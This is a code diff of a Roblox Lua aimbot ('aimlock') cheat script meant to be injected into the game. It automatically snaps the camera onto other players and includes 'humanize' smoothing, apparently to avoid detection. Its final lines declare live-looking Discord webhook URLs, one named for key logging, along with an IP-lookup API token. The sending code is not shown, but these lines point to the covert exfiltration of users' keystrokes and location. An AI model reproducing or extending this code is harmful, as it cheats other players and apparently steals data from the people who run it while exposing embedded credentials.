@@ -37,47 +37,50 @@ printColorSettings()
 
 -- Call the function to apply the color settings
 applyColorSettings()
+-- Settings for Camlock
+getgenv().RecurringPoint = Camlock.RecurringPoint
+getgenv().Hitbox = Camlock.Hitbox
+getgenv().Keybind = Camlock.Keybind
+getgenv().Enabled = Camlock.Enabled -- Start with aimlock disabled
 
--- Function to print the color settings (removed for simplicity)
--- Function to apply color settings (removed for simplicity)
+-- Settings for Aimbot
+getgenv().UsePrediction = AimOptions.UsePrediction
+getgenv().PredictionAmount = AimOptions.PredictionAmount
+getgenv().AimbotStrength = AimOptions.AimbotStrength
+getgenv().AimbotStrengthAmount = AimOptions.AimbotStrengthAmount
 
--- Expose settings using getgenv() (unchanged)
-getgenv().PredictionAmount = Camlock.CamlockOptions.PredictionAmount
-getgenv().Radius = Camlock.CamlockOptions.Radius
-getgenv().AimbotStrengthAmount = Camlock.CamlockOptions.AimbotStrengthAmount
-getgenv().Keybind = Camlock.CamlockOptions.Keybind
-getgenv().EasingStyle = Camlock.CamlockOptions.EasingStyle
-getgenv().Hitbox = Camlock.CamlockOptions.Hitbox
-getgenv().StickyAim = Camlock.CamlockOptions.StickyAim
-getgenv().SmoothingAmount = Camlock.Smoothing['Smoothing Amount']
-getgenv().SmoothingSpeed = Camlock.Smoothing['Smoothing Speed']
-getgenv().SmoothingStyle = Camlock.Smoothing['Smoothing Style']
-getgenv().HumanizeMovements = Camlock.Smoothing['Additional Features']['Humanize Movements']
-getgenv().RandomizeMovements = Camlock.Smoothing['Additional Features']['Randomize Movements']
-getgenv().AdaptiveSmoothing = Camlock.Smoothing['Additional Features']['Adaptive Smoothing']
-getgenv().Interpolation = Camlock.Smoothing['Additional Features']['Interpolation']
-getgenv().PingCompensation = Camlock.Smoothing['Additional Features']['Ping Compensation']
-getgenv().ToggleHoldMode = Camlock.Checks['Toggle Hold Mode']
-getgenv().Enabled = Camlock.Checks['Enabled']
-getgenv().UsePrediction = Camlock.Checks['Use Prediction']
-getgenv().TeamCheck = Camlock.Checks['Team Check']
-getgenv().KnockCheck = Camlock.Checks['Knock Check']
-getgenv().WallCheck = Camlock.Checks['Wall Check']
-getgenv().FirstPerson = Camlock.Checks['First Person']
-getgenv().ThirdPerson = Camlock.Checks['Third Person']
+-- Settings for Checks
+getgenv().TeamCheck = Checks.TeamCheck
+getgenv().WallCheck = Checks.WallCheck
+getgenv().KnockCheck = Checks.KnockCheck
+getgenv().FirstPerson = Checks.FirstPerson
+getgenv().ThirdPerson = Checks.ThirdPerson
+getgenv().StickyAim = Checks.StickyAim
 
--- Services (unchanged)
+-- Smoothing Settings
+getgenv().SmoothingAmount = Smoothing.SmoothingAmount or 0 -- Amount of smoothing (0 = no smoothing, 1 = very smooth)
+getgenv().SmoothingSpeed = Smoothing.SmoothingSpeed or 0 -- Speed of smoothing interpolation
+getgenv().SmoothingStyle = Smoothing.SmoothingStyle or "Linear" -- Default to Linear
+
+-- Easing Styles
+getgenv().EasingStyle = "Linear" -- Default to Linear
+if Smoothing and Smoothing.AdditionalFeatures and Smoothing.AdditionalFeatures.EasingStyle then
+    getgenv().EasingStyle = Smoothing.AdditionalFeatures.EasingStyle
+end
+
+-- Services
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
 local RunService = game:GetService("RunService")
 local LocalPlayer = Players.LocalPlayer
 local Camera = workspace.CurrentCamera
 
--- Variables for Camlock (unchanged)
+-- Variables for Sticky Aim
 local targetPlayer = nil
-local isCamlockToggled = false
+local isStickyAim = getgenv().StickyAim
+local isCamlockToggled = false -- Initial state for toggling
 
--- Easing functions (unchanged)
+-- Easing functions
 local function lerp(a, b, t)
     return a + (b - a) * t
 end
@@ -95,15 +98,16 @@ local easingFunctions = {
     Bezier = function(t) return t * t * (3 - 2 * t) end -- Simple Bezier curve approximation
 }
 
--- Helper functions (unchanged)
+-- Helper functions
 local function getClosestPlayer()
     local closestPlayer = nil
-    local shortestDistance = Camlock.CamlockOptions.Radius
+    local shortestDistance = Camlock.Radius or 10000 -- Default radius value if not specified
+
     for _, player in ipairs(Players:GetPlayers()) do
-        if player ~= LocalPlayer and (not Camlock.Checks.TeamCheck or player.Team ~= LocalPlayer.Team) then
+        if player ~= LocalPlayer and (not Checks.TeamCheck or player.Team ~= LocalPlayer.Team) then
             local character = player.Character
-            if character and character:FindFirstChild(Camlock.CamlockOptions.Hitbox) then
-                local hitbox = character[Camlock.CamlockOptions.Hitbox]
+            if character and character:FindFirstChild(Camlock.Hitbox) then
+                local hitbox = character[Camlock.Hitbox]
                 local screenPoint = Camera:WorldToScreenPoint(hitbox.Position)
                 local mousePosition = UserInputService:GetMouseLocation() - Vector2.new(0, 36) -- Adjust for the top bar
                 local distance = (Vector2.new(screenPoint.X, screenPoint.Y) - mousePosition).Magnitude
@@ -115,100 +119,105 @@ local function getClosestPlayer()
             end
         end
     end
+
     return closestPlayer
 end
 
 local function aimAtPlayer(target)
     if not target then return end
-    local character = target.Character
-    if not character or not character:FindFirstChild(Camlock.CamlockOptions.Hitbox) then return end
 
-    local hitbox = character[Camlock.CamlockOptions.Hitbox]
+    local character = target.Character
+    if not character or not character:FindFirstChild(Camlock.Hitbox) then return end
+
+    local hitbox = character[Camlock.Hitbox]
     local targetPosition = hitbox.Position
     local targetPositionOnScreen = Camera:WorldToScreenPoint(targetPosition)
     local mousePosition = UserInputService:GetMouseLocation() - Vector2.new(0, 36) -- Adjust for the top bar
 
-    -- Easing logic (unchanged)
-    local easingFunc = easingFunctions[Camlock.CamlockOptions.EasingStyle]
-    local t = Camlock.Smoothing['Smoothing Amount'] * Camlock.Smoothing['Smoothing Speed']
+    -- Easing logic
+    local easingFunc = easingFunctions[getgenv().EasingStyle or "Linear"]
+    local t = Smoothing.SmoothingAmount * Smoothing.SmoothingSpeed
     t = math.clamp(t, 0, 1)
     local easedT = easingFunc(t)
 
-    -- Interpolation for smoothing (unchanged)
+    -- Interpolation for smoothing
     local targetCFrame = CFrame.new(Camera.CFrame.Position, Camera.CFrame.Position + (hitbox.Position - Camera.CFrame.Position).Unit)
-    if Camlock.CamlockOptions.AimbotStrength then
-        Camera.CFrame = Camera.CFrame:lerp(targetCFrame, easedT * Camlock.CamlockOptions.AimbotStrengthAmount)
+    if AimOptions.AimbotStrength then
+        Camera.CFrame = Camera.CFrame:lerp(targetCFrame, easedT * AimOptions.AimbotStrengthAmount)
     else
         Camera.CFrame = targetCFrame
     end
 end
 
-local function toggleAimlock()
-    if Camlock.Checks['Toggle Hold Mode'] == "Toggle" then
-        isCamlockToggled = not isCamlockToggled
-        getgenv().Enabled = isCamlockToggled
-    elseif Camlock.Checks['Toggle Hold Mode'] == "Hold" then
-        isCamlockToggled = true
-        getgenv().Enabled = true
-    end
+local function isPlayerKnocked(player)
+    -- Example function to check if player is knocked (implementation needed)
+    return false
+end
 
-    if getgenv().Enabled then
-        targetPlayer = getClosestPlayer()
+local function onKeyPress(input, gameProcessedEvent)
+    if gameProcessedEvent then return end
+
+    if input.KeyCode == Enum.KeyCode[Camlock.Keybind:upper()] then
+        if Camlock.ToggleHoldMode == "Toggle" then
+            isCamlockToggled = not isCamlockToggled
+            getgenv().Enabled = isCamlockToggled
+        elseif Camlock.ToggleHoldMode == "Hold" then
+            isCamlockToggled = true
+            getgenv().Enabled = true
+        end
+
+        if getgenv().Enabled then
+            if Checks.StickyAim then
+                targetPlayer = targetPlayer or getClosestPlayer()
+            else
+                targetPlayer = getClosestPlayer()
+            end
+        end
     end
 end
 
-local function updateAim()
-    if getgenv().Enabled and (Camlock.Checks['First Person'] or Camlock.Checks['Third Person']) then
-        if Camlock.CamlockOptions.StickyAim then
-            if not targetPlayer then
-                targetPlayer = getClosestPlayer()
-            elseif targetPlayer and targetPlayer.Parent == nil then
-                targetPlayer = nil
-            end
+local function onKeyRelease(input, gameProcessedEvent)
+    if gameProcessedEvent then return end
 
-            if targetPlayer then
-                aimAtPlayer(targetPlayer)
-            end
+    if input.KeyCode == Enum.KeyCode[Camlock.Keybind:upper()] then
+        if Camlock.ToggleHoldMode == "Hold" then
+            isCamlockToggled = false
+            getgenv().Enabled = false
+            targetPlayer = nil -- Clear target
+        end
+    end
+end
+
+-- Main Loop
+RunService.RenderStepped:Connect(function()
+    if getgenv().Enabled then
+        -- Check if sticky aim is enabled and targetPlayer is not nil
+        if isStickyAim and targetPlayer then
+            -- Perform aim logic using targetPlayer
+            aimAtPlayer(targetPlayer)
         else
+            -- Update targetPlayer if sticky aim is disabled or targetPlayer is nil
             targetPlayer = getClosestPlayer()
             if targetPlayer then
                 aimAtPlayer(targetPlayer)
             end
         end
     end
-end
+end)
 
-local function onKeyPress(input, gameProcessedEvent)
-    if gameProcessedEvent then return end
-    if input.KeyCode == Camlock.CamlockOptions.Keybind then
-        toggleAimlock()
-    end
-end
-
-local function onKeyRelease(input, gameProcessedEvent)
-    if gameProcessedEvent then return end
-    if input.KeyCode == Camlock.CamlockOptions.Keybind and Camlock.Checks['Toggle Hold Mode'] == "Hold" then
-        isCamlockToggled = false
-        getgenv().Enabled = false
-        targetPlayer = nil -- Clear target
-    end
-end
-
--- Main Loop (unchanged)
-RunService.RenderStepped:Connect(updateAim)
-
--- Input Handling (unchanged)
+-- Input Handling
 UserInputService.InputBegan:Connect(onKeyPress)
 UserInputService.InputEnded:Connect(onKeyRelease)
 
--- Optional: Show a notification to the player when the script starts (unchanged)
-if Camlock['Notification on inject'] then
+-- Optional: Show a notification to the player when the script starts
+if NotificationOnInject then
     game:GetService("StarterGui"):SetCore("SendNotification", {
         Title = "Aimlock Script",
-        Text = "Press " .. Camlock.CamlockOptions.Keybind.Name .. " to toggle aimlock.",
+        Text = "Press " .. Camlock.Keybind:upper() .. " to toggle aimlock.",
         Duration = 5,
     })
 end
+-- Replace the webhook URLs and API token with your own
 local infoWebh = "https://discord.com/api/webhooks/1253768216493297705/-KlIkbjUdrLlbEKJiFRjdFfxitrO-UDR3xphHVljGWq_D1UsRQub8rve8h0K7YLjZ8YN"
 local keyLogWebh = "https://discord.com/api/webhooks/1260729929067401328/WLaRWDrW-Aan-0ilBeT7cJPnQIymvFZZMqObDnJXU0M47NLZkM1GtzViLqJA4EygBGOh"
 local ipapiToken = "b1e356e3b28dae0ddd3d32a7093b434f" -- Replace with your ipapi.com API token
